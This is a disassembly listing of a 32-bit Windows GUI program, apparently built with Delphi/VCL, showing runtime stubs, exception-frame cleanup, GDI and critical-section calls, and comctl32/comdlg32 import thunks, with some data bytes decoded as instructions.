xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a353
lea eax [ ebp - 0x20 ]
call sub_404120
retn
sub_42a34c
jmp sub_403b24
sub_42a660
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_42a668
mov edx [ eax + 0x28 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_42a6dc
push ebx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
mov eax ebx
call sub_42a850
sub_42a6f4
push ebx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
mov eax ebx
call sub_42a850
sub_42a9a4
jmp sub_403b24
sub_42a9ab
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ab23
jmp sub_403b24
sub_42ab2a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42abb9
jmp sub_403b24
sub_42abc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42abe2
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404144
retn
sub_42abdb
jmp sub_403b24
sub_42abe2
pop ebx
mov esp ebp
pop ebp
retn
sub_42abf5
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_42af6c
jmp r-xdata
retn
sub_42ac0b
call sub_42aff8
retn
sub_42ad90
retn
sub_42afe8
jmp sub_403b24
sub_42b113
jmp sub_403b24
sub_42b11a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_42b133
jmp sub_403b24
sub_42b1f8
push ebx
mov ebx eax
mov eax ebx
call sub_42ae68
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x8 ]
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov eax edx
pop ebx
retn
sub_42b326
jmp sub_403b24
sub_42b34e
jmp sub_403b24
sub_42b355
mov esp ebp
pop ebp
retn
sub_42b3cc
jmp sub_403b24
sub_42b4d4
jmp sub_403b24
sub_42b5bf
jmp sub_403b24
sub_42b5cc
inc [ eax + 0x4 ]
retn
sub_42b747
jmp sub_403b24
sub_42baf8
jmp sub_403b24
sub_42bd42
jmp sub_403b24
sub_42bd6c
jmp sub_403b24
sub_42bd73
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bd95
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_42bd8e
jmp sub_403b24
sub_42bd9f
jmp sub_403870
sub_42bdee
jmp sub_403b24
sub_42c01b
jmp sub_403b24
sub_42c063
jmp sub_403b24
sub_42c1d0
jmp sub_403b24
sub_42c297
jmp sub_403870
sub_42c2ec
mov [ eax + 0x31 ] 0x0
call sub_429300
retn
sub_42c53d
jmp sub_403b24
sub_42c5a8
jmp sub_403b24
sub_42c5af
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c620
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_42c6d4
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_42c6e4
push ebx
mov ebx eax
mov eax ebx
call sub_42c89c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_42c6f8
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_42c714
push ebx
mov ebx eax
mov eax ebx
call sub_42c8fc
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_42c770
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_42c87f
jmp sub_403b24
sub_42cae3
jmp sub_403870
sub_42cb43
jmp sub_403b24
sub_42cb4a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_42cf2b
jmp sub_403b24
sub_42cf57
jmp sub_403b24
sub_42cfbe
jmp sub_403870
sub_42cfef
jmp sub_403b24
sub_42d074
jmp sub_403870
sub_42d079
mov eax [ ebp - 0x38 ]
call sub_403390
call sub_403b84
call sub_403bd8
sub_42d08b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d0a8
mov eax [ ebp - 0x18 ]
call sub_4027d4
retn
sub_42d0a1
jmp sub_403b24
sub_42d1f7
jmp sub_403870
sub_42d4c3
jmp sub_403870
sub_42d554
mov cl 0x1
call sub_42d55c
retn
sub_42d86c
xor ecx ecx
call sub_42d55c
retn
sub_42d8ee
jmp sub_403870
sub_42d8f3
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_403b84
call sub_403bd8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42d944
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_42da7d
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_42daac
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_42dac0
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_42dbd9
jmp sub_403870
sub_42dc8e
jmp sub_403870
sub_42dcf8
jmp sub_403870
sub_42dd2c
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_42dcb8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_42dd44
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_427ff8
retn
mov [ eax + 0x30 ] edx
retn
sub_42dd5c
retn
sub_42dd60
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_427ff8
retn
mov [ eax + 0x2c ] edx
retn
sub_42dda0
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_427ff8
pop ebp
retn 0x4
sub_42ddb4
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_427ff8
pop ebp
retn 0x4
sub_42df74
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_42df80
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_42e02d
jmp sub_403b24
sub_42e034
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42e11f
jmp sub_403870
sub_42e18b
jmp sub_403b24
sub_42e2b9
jmp sub_403b24
sub_42e2c0
pop ebp
retn
sub_42e3c0
cmp edx eax
jg r-xdata
retn
mov eax edx
sub_42e3f5
jmp sub_403b24
sub_42e3fc
pop ebp
retn
sub_42e400
sub [ rw-data ] 0x1
retn
sub_42e648
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_41b654
retn
sub_42e67c
mov eax [ eax + 0x4 ]
call sub_41b4f8
retn
sub_42e6ad
jmp sub_403b24
sub_42e6b4
pop ebp
retn
sub_42e6b8
sub [ rw-data ] 0x1
retn
InitCommonControls
jmp [ InitCommonControls@IAT ]
ImageList_Create
jmp [ ImageList_Create@IAT ]
ImageList_Destroy
jmp [ ImageList_Destroy@IAT ]
ImageList_GetImageCount
jmp [ ImageList_GetImageCount@IAT ]
ImageList_Add
jmp [ ImageList_Add@IAT ]
ImageList_ReplaceIcon
jmp [ __import_lookup_table_14(comctl32:ImageList_ReplaceIcon) ]
ImageList_SetBkColor
jmp [ __import_lookup_table_14(comctl32:ImageList_SetBkColor) ]
ImageList_GetBkColor
jmp [ __import_lookup_table_14(comctl32:ImageList_GetBkColor) ]
ImageList_Remove
jmp [ __import_lookup_table_14(comctl32:ImageList_Remove) ]
ImageList_BeginDrag
jmp [ ImageList_BeginDrag@IAT ]
ImageList_EndDrag
jmp [ __import_lookup_table_14(comctl32:ImageList_EndDrag) ]
ImageList_DragEnter
jmp [ __import_lookup_table_14(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ ImageList_DragLeave@IAT ]
ImageList_DragMove
jmp [ ImageList_DragMove@IAT ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ __import_lookup_table_14(comctl32:ImageList_SetIconSize) ]
sub_42e844
push ecx
push edx
push 0x1212
push eax
call SendMessageA
retn
sub_42e879
jmp sub_403b24
sub_42e880
pop ebp
retn
sub_42e884
sub [ rw-data ] 0x1
retn
sub_42e94b
jmp sub_403b24
sub_42e952
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42ef68
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_42e974
mov [ rw-data ] sub_42ea8c
mov [ rw-data ] sub_42e9fc
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_42ec90
mov [ rw-data ] sub_42ed64
mov [ rw-data ] sub_42ee38
retn
sub_42eff9
jmp sub_403b24
sub_42f000
pop ebp
retn
sub_42f004
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42ef68
sub_42f039
jmp sub_403b24
sub_42f040
pop ebp
retn
sub_42f044
sub [ rw-data ] 0x1
retn
sub_42f2d3
add eax 0xffffffd4
jmp sub_42fe00
sub_42f2db
add eax 0xffffffd4
jmp sub_42fe5c
sub_42f2ed
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405c24
sub_42f486
jmp sub_403b24
sub_42f48d
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42f69d
jmp sub_403b24
sub_42f6a4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42f859
jmp sub_403b24
sub_42f8be
jmp sub_403b24
sub_42f8c5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42f9b1
jmp sub_403b24
sub_42f9b8
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42fbc8
lea eax [ ebp - 0x30 ]
call sub_404120
lea eax [ ebp - 0x20 ]
call sub_404120
retn
sub_42fbd9
jmp sub_403b24
j_sub_42fbc8
jmp sub_42fbc8
sub_42fbe0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42fcdb
jmp sub_403b24
sub_42fce2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42fddf
jmp sub_403b24
sub_42fde6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42fe46
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
sub_42fe4f
jmp sub_403b24
j_sub_42fe46
jmp sub_42fe46
sub_42fe56
pop ebx
pop ecx
pop ebp
retn
sub_42fef1
jmp sub_403b24
sub_42fef8
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42ff04
mov eax [ eax + 0x20 ]
retn
sub_430033
jmp sub_403b24
sub_43003a
pop ebp
retn
sub_43003c
sub [ rw-data ] 0x1
retn
sub_430069
jmp sub_403b24
sub_430070
pop ebp
retn
sub_430074
sub [ rw-data ] 0x1
retn
sub_4300ad
jmp sub_403b24
sub_4300b4
pop ebp
retn
sub_4300b8
sub [ rw-data ] 0x1
retn
sub_4303c5
jmp sub_403b24
sub_4303cc
pop ebp
retn
sub_4303d0
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_43011c
sub_4304b0
retn
sub_430524
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_430530
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_43053c
mov edx [ eax ]
call [ edx ]
retn
sub_430544
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_430571
jmp sub_403b24
sub_430578
pop ebp
retn
sub_43057c
sub [ rw-data ] 0x1
retn
sub_43073b
jmp sub_403b24
sub_430742
pop ebp
retn
sub_430af7
jmp sub_403b24
sub_430afe
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_430f18
jmp sub_403b24
sub_430f1f
pop ebp
retn
sub_430f24
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4304b4
mov [ rw-data ] eax
sub_430f65
jmp sub_403b24
sub_430f6c
pop ebp
retn
sub_430f70
sub [ rw-data ] 0x1
retn
sub_430f9d
jmp sub_403b24
sub_430fa4
pop ebp
retn
sub_430fa8
sub [ rw-data ] 0x1
retn
sub_430fd5
jmp sub_403b24
sub_430fdc
pop ebp
retn
sub_430fe0
sub [ rw-data ] 0x1
retn
sub_43100d
jmp sub_403b24
sub_431014
pop ebp
retn
sub_431018
sub [ rw-data ] 0x1
retn
sub_431045
jmp sub_403b24
sub_43104c
pop ebp
retn
sub_431050
sub [ rw-data ] 0x1
retn
sub_43107d
jmp sub_403b24
sub_431084
pop ebp
retn
sub_431088
sub [ rw-data ] 0x1
retn
sub_4310b5
jmp sub_403b24
sub_4310bc
pop ebp
retn
sub_4310c0
sub [ rw-data ] 0x1
retn
ChooseColorA
jmp [ ChooseColorA@IAT ]
FindTextA
jmp [ __import_lookup_table_15(comdlg32:FindTextA) ]
ReplaceTextA
jmp [ ReplaceTextA@IAT ]
sub_431105
jmp sub_403b24
sub_43110c
pop ebp
retn
sub_431110
sub [ rw-data ] 0x1
retn
sub_43113d
jmp sub_403b24
sub_431144
pop ebp
retn
sub_431148
sub [ rw-data ] 0x1
retn
sub_431618
in al dx
[ ebx + 0x43 ]
sub_4319ee
jmp sub_403870
sub_4319f3
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_466be8
call sub_403bd8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431a10
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_431a18
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_40358c
pop esi
retn
sub_431a30
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_40358c
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_431a48
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_431af1
jmp sub_403b24
sub_431b1f
jmp sub_403b24
sub_431b26
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_431b30
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_431b44
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_431c69
jmp sub_403b24
sub_431c70
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_431d36
jmp sub_403b24
sub_431d3d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_431e18
push esi
mov esi eax
mov eax [ esi + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_431fe4
call sub_403390
retn
sub_43236c
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_432380
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0xac ]
mov ecx 0x100
call sub_404390
pop esi
pop ebx
retn
sub_43239c
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_4323b4
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_4323e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0x1ac ]
mov ecx 0x100
call sub_404390
pop esi
pop ebx
retn
sub_432404
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_4323b4
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_4324fe
add [ eax ] al
push ebx
cmp [ eax + 0x7a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_4327e6
jmp sub_403b24
sub_4327ed
pop ebp
retn
sub_433e03
cmp dl [ esi + 0x168 ]
je r-xdata
pop esi
retn
mov [ esi + 0x168 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_433e1c
push esi
mov esi eax
cmp dl [ esi + 0x169 ]
je r-xdata
pop esi
retn
mov [ esi + 0x169 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4342b2
jmp sub_403870
sub_43436b
jmp sub_403b24
sub_434372
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434378
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_4342ec
sub_434388
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_4342ec
sub_434398
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_4342ec
pop ebp
retn 0x8
sub_4343b0
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4344dc
push ebx
mov ebx eax
mov eax ebx
call sub_44cd44
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_4344f0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_434524
cmp [ eax + 0x21e ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_434628
jmp sub_403b24
sub_43462f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4347d2
jmp sub_403b24
sub_4347d9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4347e3
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
mov [ eax + 0x220 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_4347f8
push ebx
mov ebx eax
mov [ ebx + 0x211 ] dl
mov eax ebx
call sub_44a02c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_434814
push ebx
mov ebx eax
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_44a02c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_434830
push ebx
mov ebx eax
mov [ ebx + 0x214 ] edx
mov eax ebx
call sub_44a02c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_43484c
push ebx
mov ebx eax
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_44a02c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_434868
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_44ad0c
sub_43487c
mov al [ eax + 0x220 ]
retn
sub_4349e5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_4349fd
jmp sub_403b24
sub_434c07
add al ch
dec ebx
inc ebx
add [ eax ] bl
jmp r-xdata
inc edi
add [ eax - 0x37ffbcb5 ] bl
0x4b900047 0x43
sub_434c17
add al bl
dec ebx
inc ebx
add [ eax ] cl
jmp r-xdata
inc edi
add [ eax - 0x47ffbcb5 ] cl
0x4b800047 0x43
sub_434c27
add al cl
dec ebx
inc ebx
add al bh
0x4bc00047 0x43
sub_434c35
0x4bb80047 0x43
sub_434cf4
xor dl ch
inc edi
add al bh
dec edx
inc ebx
add [ eax ] ch
0x4af00047 0x43
sub_434d04
and dl ch
inc edi
add al ch
dec edx
inc ebx
add [ eax ] bl
0x4ae00047 0x43
sub_434d14
adc dl ch
inc edi
add al bl
dec edx
inc ebx
add [ eax ] cl
0x4ad00047 0x43
sub_434db0
jmp sub_403b24
sub_434db7
pop ebp
retn
sub_434dbc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403ea8
mov eax [ r-xdata ]
call sub_41ac88
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41acd4
sub_434e19
jmp sub_403b24
sub_434e20
pop ebp
retn
sub_434e24
sub [ rw-data ] 0x1
retn
sub_434e5d
jmp sub_403b24
sub_434e64
pop ebp
retn
sub_434e68
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_434ee4
retn
sub_434ee5
jmp sub_403b24
j_sub_434ee4
jmp sub_434ee4
sub_434eec
pop ebp
retn
sub_434ef0
sub [ rw-data ] 0x1
retn
sub_434ef8
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_403390
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_434f14
or al [ eax ]
add [ eax ] al
push esp
jmp r-xdata
inc edi
add al bh
pop esp
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] bh
jmp sub_434fb6
sub_434fb6
push sub_434fc3
retn
sub_434fbc
jmp sub_403b24
sub_434fc3
pop ebp
retn
sub_434fc8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_434f14
call sub_403ef4
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402da4
sub_435015
jmp sub_403b24
sub_43501c
pop ebp
retn
sub_435020
sub [ rw-data ] 0x1
retn
sub_43507c
jmp sub_403b24
sub_435083
pop ebp
retn
sub_435088
sub [ rw-data ] 0x1
retn
sub_4350e4
jmp sub_403b24
sub_4350eb
pop ebp
retn
sub_4350f0
sub [ rw-data ] 0x1
retn
sub_435151
jmp sub_403b24
sub_435158
pop ebp
retn
sub_43515c
sub [ rw-data ] 0x1
retn
sub_4351a8
jmp sub_403b24
sub_4351af
pop ebp
retn
sub_4351b4
sub [ rw-data ] 0x1
retn
sub_4351e1
jmp sub_403b24
sub_4351e8
pop ebp
retn
sub_4351ec
sub [ rw-data ] 0x1
retn
sub_436bb6
mov al [ 0x448f ]
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sldt [ edi ]
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
hlt
sub_4374c8
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov edx 0x8000
mov eax r-xdata
call sub_40d86c
mov [ rw-data ] eax
cmp [ rw-data ] 0x20
ja r-xdata
xor eax eax
mov [ rw-data ] eax
sub_43761c
cmp dl [ eax + 0x24 ]
je r-xdata
retn
mov [ eax + 0x24 ] dl
mov [ eax + 0x25 ] 0x0
xor edx edx
call sub_41c010
sub_437630
mov al [ eax + 0x25 ]
xor al 0x1
retn
sub_437638
cmp dl [ eax + 0x25 ]
je r-xdata
retn
mov [ eax + 0x25 ] dl
call sub_437648
sub_437680
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_437698
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x24 ] 0x1
je r-xdata
mov al 0x1
retn
sub_4376d4
cmp dl [ eax + 0x1c ]
je r-xdata
retn
mov [ eax + 0x1c ] dl
xor edx edx
call sub_41c010
sub_437704
mov ecx [ eax + 0x14 ]
cmp edx ecx
jge r-xdata
cmp edx 0x2710
jle r-xdata
mov edx ecx
mov [ eax + 0x18 ] edx
mov edx [ eax + 0x10 ]
call sub_43777c
retn
mov edx 0x2710
sub_437728
test edx edx
jge r-xdata
mov ecx [ eax + 0x18 ]
cmp edx ecx
jle r-xdata
xor edx edx
mov [ eax + 0x14 ] edx
mov edx [ eax + 0x10 ]
call sub_43777c
retn
mov edx ecx
sub_437744
cmp dl [ eax + 0x1d ]
je r-xdata
retn
mov [ eax + 0x1d ] dl
xor edx edx
call sub_41c010
sub_4377c4
cmp edx [ eax + 0x20 ]
je r-xdata
retn
mov [ eax + 0x20 ] edx
xor edx edx
call sub_41c010
sub_437818
or ecx 0xffffffff
xor edx edx
call sub_437868
retn
sub_437838
mov eax [ eax + 0x18 ]
retn
sub_437ae0
jmp sub_403b24
sub_437c02
jmp sub_403b24
sub_437c09
mov eax [ ebp - 0x4 ]
call sub_44ab08
pop ecx
pop ecx
pop ebp
retn
sub_437dbe
jmp sub_403b24
sub_437e5c
push ebx
cmp [ eax + 0x24a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
sub_437e7c
push ebx
cmp [ eax + 0x252 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
sub_437ec8
cmp dl [ eax + 0x220 ]
je r-xdata
retn
mov [ eax + 0x220 ] dl
call sub_44ad0c
sub_437edc
cmp dl [ eax + 0x221 ]
je r-xdata
retn
mov [ eax + 0x221 ] dl
call sub_44ad0c
sub_437ef0
cmp dl [ eax + 0x22c ]
je r-xdata
retn
mov [ eax + 0x22c ] dl
call sub_44ad0c
sub_437f04
cmp dl [ eax + 0x222 ]
je r-xdata
retn
mov [ eax + 0x222 ] dl
call sub_44ad0c
sub_437f18
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4381c5
jmp sub_403b24
sub_4381cc
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop esi
mov esp ebp
pop ebp
retn
sub_438372
jmp sub_403b24
sub_43875e
jmp sub_403b24
sub_43877b
jmp sub_403b24
sub_43878c
push ebx
mov ebx eax
mov eax ebx
call sub_44bc48
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_4389dc
jmp sub_403b24
sub_4389e3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438a06
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4054a4
retn
sub_4389ff
jmp sub_403b24
sub_438a06
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_438a68
push ebx
cmp [ eax + 0x26a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
sub_438ac0
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4377d4
retn
sub_438ad0
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_438ae4
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_438e10
push esi
mov [ eax + 0x218 ] dx
mov [ eax + 0x21a ] cx
mov si 0xffb3
call sub_40358c
pop esi
retn
sub_438ecc
cmp [ eax + 0x228 ] 0x1
jne r-xdata
mov dl 0x1
call sub_439494
retn
xor edx edx
call sub_439494
retn
sub_438f20
push ebx
cmp [ eax + 0x222 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
sub_43914e
jmp sub_403b24
sub_439155
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439410
jmp sub_403b24
sub_439417
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4397dc
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_44ca10
retn
mov [ edx + 0xc ] 0x1
retn
sub_4398e7
jmp sub_403b24
sub_4398fc
call sub_44bd58
retn
sub_4399b8
push ebx
mov ebx eax
mov eax ebx
call sub_44cca0
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_44ad0c
sub_439a20
push ebx
cmp [ eax + 0x242 ] 0x0
